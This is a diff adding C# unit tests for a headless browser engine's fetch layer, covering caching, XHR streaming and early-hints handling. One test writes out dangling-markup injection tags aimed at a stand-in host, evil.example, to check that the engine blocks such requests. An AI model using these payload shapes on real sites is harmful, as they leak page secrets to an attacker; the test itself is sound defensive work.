@@ -20,11 +20,12 @@ public sealed class FetchTests : IDisposable
         TestScriptEngines.Dispose(_engine);
     }
 
-    private Document Load(string html)
+    private Document Load(string html, CookieJar? cookieJar = null)
     {
         var context = _contexts.Create(new BrowsingContextOptions
         {
             DocumentLoader = _loader,
+            CookieJar = cookieJar,
             ScriptEngine = _engine,
             UnhandledScriptError = (_, error) => _errors.Add(error),
         });
@@ -182,6 +183,63 @@ public sealed class FetchTests : IDisposable
             </script>
             """);
         Assert.Equal("hello|text/plain:blob", document.Title);
+    }
+
+    [Fact]
+    public void Fetch_DanglingMarkup_IsANetworkError()
+    {
+        _loader.Responses["https://example.com/data?%3C"] = new DocumentResource("brace");
+        _loader.Responses["https://example.com/data"] = new DocumentResource("newline");
+        var document = Load("""
+            <script>
+              Promise.all([
+                fetch('data?<').then(r => r.text()),
+                fetch('da\nta').then(r => r.text()),
+                fetch(' \n data \n ').then(r => r.text()),
+                fetch('data?\n<').then(() => 'resolved', e => e.name),
+                fetch('data?<\tx').then(() => 'resolved', e => e.name),
+                fetch(new Request('data?\r<')).then(() => 'resolved', e => e.name),
+              ]).then(results => { document.title = results.join('|'); });
+            </script>
+            """);
+        Assert.Equal("brace|newline|newline|TypeError|TypeError|TypeError", document.Title);
+    }
+
+    [Fact]
+    public void Fetch_DanglingMarkup_ElementsDoNotRequestTheUrl()
+    {
+        _loader.Handler = request => request.Url.StartsWith("https://evil.example/", StringComparison.Ordinal) ? new DocumentResource("") { Headers = [new("Access-Control-Allow-Origin", "*")] } : null;
+
+        // The URL of each element has a newline and a "<" (the markup that follows an attribute whose quote is not closed),
+        // except the URLs of the "allowed" elements, which have a "<" only
+        var document = Load("""
+            <script src="https://evil.example/classic?x=
+            <secret>"></script>
+            <script src="https://evil.example/classic?allowed=<"></script>
+            <script type="module" src="https://evil.example/module?x=
+            <secret>"></script>
+            <script type="module" src="https://evil.example/module?allowed=<"></script>
+            <img src="https://evil.example/img?x=
+            <secret>">
+            <img src="https://evil.example/img?allowed=<">
+            <link rel="stylesheet" href="https://evil.example/link?x=
+            <secret>">
+            <link rel="stylesheet" href="https://evil.example/link?allowed=<">
+            <iframe src="https://evil.example/iframe?x=
+            <secret>"></iframe>
+            <iframe src="https://evil.example/iframe?allowed=<"></iframe>
+            """);
+
+        var requested = _loader.Requests.Select(request => request.Url).Where(url => url.StartsWith("https://evil.example/", StringComparison.Ordinal)).Distinct(StringComparer.Ordinal).Order(StringComparer.Ordinal);
+        Assert.Equal(
+            [
+                "https://evil.example/classic?allowed=%3C",
+                "https://evil.example/iframe?allowed=%3C",
+                "https://evil.example/img?allowed=%3C",
+                "https://evil.example/link?allowed=%3C",
+                "https://evil.example/module?allowed=%3C",
+            ],
+            requested);
     }
 
     [Fact]
@@ -500,6 +558,75 @@ public sealed class FetchTests : IDisposable
     }
 
     [Fact]
+    public async Task HttpCache_StaleWhileRevalidate_UsesTheStaleResponseAndRevalidatesItInTheBackground()
+    {
+        var count = 0;
+        _loader.Handler = request => request.Url == "https://example.com/swr"
+            ? new DocumentResource(Interlocked.Increment(ref count).ToString(System.Globalization.CultureInfo.InvariantCulture)) { Headers = [new("Cache-Control", "max-age=0, stale-while-revalidate=60")] }
+            : null;
+        var document = Load("""
+            <script>
+              (async () => {
+                const results = [];
+                for (let i = 0; i < 2; i++) {
+                  results.push(await (await fetch('swr')).text());
+                }
+
+                document.title = results.join('|');
+              })();
+            </script>
+            """);
+
+        // The second fetch gets the stale response, and the response is revalidated in the background
+        await WaitUntilAsync(() => document.Title.Length > 0 && Volatile.Read(ref count) == 2, () => document.Title + " " + count);
+        Assert.Equal("1|1", document.Title);
+
+        // The revalidated response is used by the next fetch, and a request that sets a maximum age waits for the validation
+        TestScriptEngines.Evaluate(_engine, document.DefaultView!, "(async () => { document.title = await (await fetch('swr')).text() + '|' + await (await fetch('swr', { cache: 'no-cache' })).text(); })()");
+        await WaitUntilAsync(() => document.Title.Split('|').Length == 2 && Volatile.Read(ref count) >= 4, () => document.Title + " " + count);
+        Assert.Equal("2|4", document.Title);
+    }
+
+    [Fact]
+    public async Task HttpCache_StaleWhileRevalidate_ProcessesTheClearSiteDataHeaderOfTheBackgroundRevalidation()
+    {
+        var count = 0;
+        _loader.Handler = request =>
+        {
+            if (request.Url != "https://example.com/swr")
+                return null;
+
+            var value = Interlocked.Increment(ref count);
+            List<KeyValuePair<string, string>> headers = [new("Cache-Control", "max-age=0, stale-while-revalidate=60")];
+            if (value > 1)
+            {
+                headers.Add(new("Clear-Site-Data", "\"cookies\", \"cache\""));
+            }
+
+            return new DocumentResource(value.ToString(System.Globalization.CultureInfo.InvariantCulture)) { Headers = headers };
+        };
+        var document = Load("""
+            <script>
+              document.cookie = 'a=1';
+              (async () => {
+                const results = [document.cookie];
+                for (let i = 0; i < 2; i++) {
+                  results.push(await (await fetch('swr')).text());
+                }
+
+                document.title = results.join('|') + '|' + document.cookie;
+              })();
+            </script>
+            """, new CookieJar());
+
+        // The response of the background revalidation clears the cookies, and the HTTP cache: it is not stored either
+        await WaitUntilAsync(() => document.Title.Length > 0 && Volatile.Read(ref count) == 2, () => document.Title + " " + count);
+        Assert.Equal("a=1|1|1|", document.Title);
+        TestScriptEngines.Evaluate(_engine, document.DefaultView!, "(async () => { document.title = await (await fetch('swr')).text(); })()");
+        await WaitUntilAsync(() => document.Title == "3", () => document.Title + " " + count);
+    }
+
+    [Fact]
     public void HttpCache_CacheModes()
     {
         var count = 0;
@@ -587,6 +714,194 @@ public sealed class FetchTests : IDisposable
         await WaitUntilAsync(() => document.Title.Length > 0, () => document.Title);
         Assert.Equal("ab|ab", document.Title);
         Assert.Single(_loader.Requests, request => request.Url == "https://example.com/stream");
+    }
+
+    [Fact]
+    public async Task XmlHttpRequest_StreamsTheResponseBody()
+    {
+        var chunks = Channel.CreateUnbounded<ReadOnlyMemory<byte>>();
+        _loader.Responses["https://example.com/stream"] = new DocumentResource("a"u8.ToArray()) { Headers = [new("Content-Type", "text/plain")], RemainingContentBytes = chunks.Reader.ReadAllAsync() };
+        var document = Load("""
+            <script>
+              const xhr = new XMLHttpRequest();
+              const log = [];
+              xhr.onreadystatechange = () => { log.push(xhr.readyState + ':' + xhr.responseText); document.title = log.join('|'); };
+              xhr.onprogress = e => { log.push('progress:' + e.loaded); document.title = log.join('|'); };
+              xhr.open('GET', 'stream');
+              xhr.send();
+            </script>
+            """);
+
+        // The events of each chunk are fired as it arrives (at most every 50 ms)
+        await WaitUntilAsync(() => document.Title.EndsWith("progress:1", StringComparison.Ordinal), () => document.Title);
+        Assert.True(Assert.Single(_loader.Requests, request => request.Url == "https://example.com/stream").StreamsResponseBody);
+        await Task.Delay(100, TestContext.Current.CancellationToken);
+        chunks.Writer.TryWrite("b"u8.ToArray());
+        await WaitUntilAsync(() => document.Title.EndsWith("progress:2", StringComparison.Ordinal), () => document.Title);
+        chunks.Writer.TryComplete();
+        await WaitUntilAsync(() => document.Title.Contains("4:ab", StringComparison.Ordinal), () => document.Title);
+        Assert.Equal("1:|2:|3:a|progress:1|3:ab|progress:2|4:ab", document.Title);
+    }
+
+    [Fact]
+    public async Task XmlHttpRequest_ResponseTextHasTheChunksWhoseEventsAreNotFired()
+    {
+        var chunks = Channel.CreateUnbounded<ReadOnlyMemory<byte>>();
+        _loader.Responses["https://example.com/stream"] = new DocumentResource("a"u8.ToArray()) { Headers = [new("Content-Type", "text/plain")], RemainingContentBytes = chunks.Reader.ReadAllAsync() };
+
+        // The clock does not advance: the events of the chunks that follow the first one are not fired (they would be fired
+        // less than 50 ms after the events of the previous chunk)
+        var context = _contexts.Create(new BrowsingContextOptions
+        {
+            DocumentLoader = _loader,
+            ScriptEngine = _engine,
+            TimeProvider = new Microsoft.Extensions.Time.Testing.FakeTimeProvider(),
+            UnhandledScriptError = (_, error) => _errors.Add(error),
+        });
+        var document = context.Navigate("https://example.com/", _ => """
+            <script>
+              const xhr = new XMLHttpRequest();
+              let progress = 0;
+              xhr.onprogress = () => progress++;
+              document.addEventListener('read', () => { document.title = progress + ':' + xhr.responseText; });
+              xhr.open('GET', 'stream');
+              xhr.send();
+            </script>
+            """);
+
+        string Read()
+        {
+            document.DispatchEvent(new Event("read"));
+            return document.Title;
+        }
+
+        await WaitUntilAsync(() => Read() == "1:a", () => document.Title);
+        chunks.Writer.TryWrite("b"u8.ToArray());
+        await WaitUntilAsync(() => Read() == "1:ab", () => document.Title);
+        chunks.Writer.TryComplete();
+        Assert.Empty(_errors);
+    }
+
+    [Fact]
+    public async Task XmlHttpRequest_BodyFailingAfterTheResponse_IsANetworkError()
+    {
+        var chunks = Channel.CreateUnbounded<ReadOnlyMemory<byte>>();
+        _loader.Responses["https://example.com/stream"] = new DocumentResource("a"u8.ToArray()) { RemainingContentBytes = chunks.Reader.ReadAllAsync() };
+        var document = Load("""
+            <script>
+              const xhr = new XMLHttpRequest();
+              const log = [];
+              for (const type of ['progress', 'load', 'error']) xhr.addEventListener(type, () => { log.push(type); document.title = log.join('|'); });
+              xhr.open('GET', 'stream');
+              xhr.send();
+            </script>
+            """);
+
+        await WaitUntilAsync(() => document.Title == "progress", () => document.Title);
+        chunks.Writer.TryComplete(new IOException("The connection was closed"));
+        await WaitUntilAsync(() => document.Title != "progress", () => document.Title);
+        Assert.Equal("progress|error", document.Title);
+    }
+
+    [Fact]
+    public void Fetch_InterimResponses_AreTheFirstInterimResponseStart()
+    {
+        _loader.Handler = request =>
+        {
+            if (request.Url != "https://example.com/interim")
+                return null;
+
+            request.ReportInterimResponse(100, []);
+            request.ReportInterimResponse(103, [new("Link", "</style.css>; rel=preload; as=style")]);
+            return new DocumentResource("body"u8.ToArray());
+        };
+        var document = Load("""
+            <script>
+              fetch('interim').then(response => response.text()).then(() => {
+                const [entry] = performance.getEntriesByName('https://example.com/interim');
+                document.title = (entry.firstInterimResponseStart > 0) + '|' + (entry.firstInterimResponseStart <= entry.finalResponseHeadersStart) + '|' + (entry.responseStart === entry.firstInterimResponseStart);
+              });
+            </script>
+            """);
+        Assert.Equal("true|true|true", document.Title);
+
+        // The early hints of a subresource are not processed
+        Assert.DoesNotContain(_loader.Requests, request => request.Url == "https://example.com/style.css");
+    }
+
+    [Theory]
+    [InlineData(100)]
+    [InlineData(103)]
+    [InlineData(199)]
+    public void Fetch_FinalResponseWithAnInterimStatus_IsANetworkError(int status)
+    {
+        _loader.Responses["https://example.com/interim"] = new DocumentResource("body"u8.ToArray()) { StatusCode = status };
+        var document = Load("""
+            <script>
+              fetch('interim').then(response => { document.title = response.status; }, e => { document.title = e.name; });
+            </script>
+            """);
+        Assert.Equal("TypeError", document.Title);
+    }
+
+    [Fact]
+    public void Fetch_InterimResponseWithAnInvalidHeader_IsANetworkError()
+    {
+        _loader.Handler = request =>
+        {
+            request.ReportInterimResponse(103, [new("X-Test", "a\0b")]);
+            return new DocumentResource("body"u8.ToArray());
+        };
+        var document = Load("""
+            <script>
+              fetch('interim').then(response => { document.title = response.status; }, e => { document.title = e.name; });
+            </script>
+            """);
+        Assert.Equal("TypeError", document.Title);
+    }
+
+    [Fact]
+    public void DocumentRequest_ReportInterimResponse_RejectsTheFinalStatuses()
+    {
+        var request = new DocumentRequest("https://example.com/");
+        Assert.Throws<ArgumentOutOfRangeException>("statusCode", () => request.ReportInterimResponse(101, []));
+        Assert.Throws<ArgumentOutOfRangeException>("statusCode", () => request.ReportInterimResponse(200, []));
+
+        var forwarded = new List<int>();
+        var copy = new DocumentRequest("https://example.com/") { InterimResponseHandler = (status, _) => forwarded.Add(status) };
+        copy.ReportInterimResponse(103, []);
+        Assert.Equal([103], forwarded);
+    }
+
+    [Fact]
+    public void EarlyHints_PreloadTheResourcesOfTheNavigation()
+    {
+        var loader = new StubLoader();
+        loader.Responses["https://example.com/script.js"] = new DocumentResource("document.title += '|script';"u8.ToArray()) { Headers = [new("Content-Type", "text/javascript")] };
+        loader.Responses["https://other.example/blocked.js"] = new DocumentResource(""u8.ToArray()) { Headers = [new("Content-Type", "text/javascript")] };
+        loader.Handler = request =>
+        {
+            if (request.Url != "https://example.com/page")
+                return null;
+
+            // Only the first 103 response is processed, with its content security policy
+            request.ReportInterimResponse(103, [new("Link", "</script.js>; rel=preload; as=script, <https://other.example/blocked.js>; rel=preload; as=script"), new("Content-Security-Policy", "script-src 'self'")]);
+            request.ReportInterimResponse(103, [new("Link", "</other.js>; rel=preload; as=script")]);
+            return new DocumentResource("""
+                <script>document.title = 'page';</script>
+                <script src="script.js"></script>
+                <script>document.title += '|' + performance.getEntriesByName('https://example.com/script.js').map(entry => entry.initiatorType).join(',');</script>
+                """u8.ToArray()) { Headers = [new("Content-Type", "text/html")] };
+        };
+        var context = _contexts.Create(new BrowsingContextOptions { DocumentLoader = loader, ScriptEngine = _engine, UnhandledScriptError = (_, error) => _errors.Add(error) });
+
+        context.Navigate("https://example.com/page");
+        _contexts.EventLoop.RunUntilIdle();
+
+        Assert.Empty(_errors);
+        Assert.Equal("page|script|early-hints", context.Document.Title);
+        Assert.Single(loader.Requests, request => request.Url == "https://example.com/script.js");
+        Assert.DoesNotContain(loader.Requests, request => request.Url is "https://other.example/blocked.js" or "https://example.com/other.js");
     }
 
     [Fact]
